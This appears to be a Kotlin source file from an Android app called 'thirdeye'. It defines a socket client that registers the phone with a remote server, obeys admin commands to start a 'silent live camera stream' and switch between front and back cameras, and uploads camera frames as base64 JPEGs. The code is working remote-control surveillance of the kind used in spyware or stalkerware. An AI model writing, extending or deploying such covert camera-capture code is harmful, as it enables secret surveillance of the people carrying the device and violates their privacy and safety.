package com.thirdeye.app.uploader

import android.content.Context
import android.util.Base64
import android.util.Log
import com.thirdeye.app.service.LiveStreamService
import com.thirdeye.app.utils.AppPreferences
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

object SocketManager {
    private const val TAG = "SocketManager"

    private var socket: Socket? = null
    private var isConnecting = false

    fun initAndConnect(context: Context) {
        if (socket?.connected() == true || isConnecting) return

        try {
            isConnecting = true
            val prefs = AppPreferences(context)
            val serverUrl = prefs.serverUrl.trimEnd('/')

            val options = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 2000
                timeout = 10000
                transports = arrayOf("websocket", "polling")
            }

            socket = IO.socket(URI.create(serverUrl), options)

            socket?.on(Socket.EVENT_CONNECT) {
                isConnecting = false
                Log.i(TAG, " Connected to central backend socket!")
                registerDevice(context)
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnecting = false
                Log.w(TAG, " Disconnected from backend socket")
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                isConnecting = false
                Log.w(TAG, "Socket connection error: ${args.firstOrNull()}")
            }

            // Command from Admin to start silent live camera stream
            socket?.on("start-live-stream") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received START live stream command (Lens: $camera)")
                    LiveStreamService.startService(context, camera)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling start-live-stream", e)
                }
            }

            // Command from Admin to stop live stream
            socket?.on("stop-live-stream") {
                Log.i(TAG, " Received STOP live stream command")
                LiveStreamService.stopService(context)
            }

            // Command from Admin to switch camera (FRONT <-> BACK)
            socket?.on("switch-camera") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received SWITCH camera command: $camera")
                    LiveStreamService.switchCamera(context, camera)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling switch-camera", e)
                }
            }

            socket?.connect()
        } catch (e: Exception) {
            isConnecting = false
            Log.e(TAG, "Socket init error", e)
        }
    }

    private fun registerDevice(context: Context) {
        try {
            val deviceId = BackendClient.getDeviceId(context)
            val deviceName = BackendClient.getDeviceName()
            val battery = BackendClient.getBatteryLevel(context)

            val payload = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("batteryLevel", battery)
            }

            socket?.emit("register-device", payload)
            Log.d(TAG, "Device registered on socket: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Failed registering device", e)
        }
    }

    /**
     * Streams a compressed JPEG frame to backend over WebSocket
     */
    fun sendFrame(context: Context, jpegBytes: ByteArray) {
        if (socket?.connected() != true) return

        try {
            val base64Frame = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("deviceId", BackendClient.getDeviceId(context))
                put("frame", base64Frame)
            }
            socket?.emit("stream-frame", payload)
        } catch (e: Exception) {
            Log.w(TAG, "Failed sending frame: ${e.message}")
        }
    }

    fun isConnected(): Boolean {
        return socket?.connected() == true
    }

    fun disconnect() {
        socket?.disconnect()
        socket?.off()
        socket = null
        isConnecting = false
    }
}
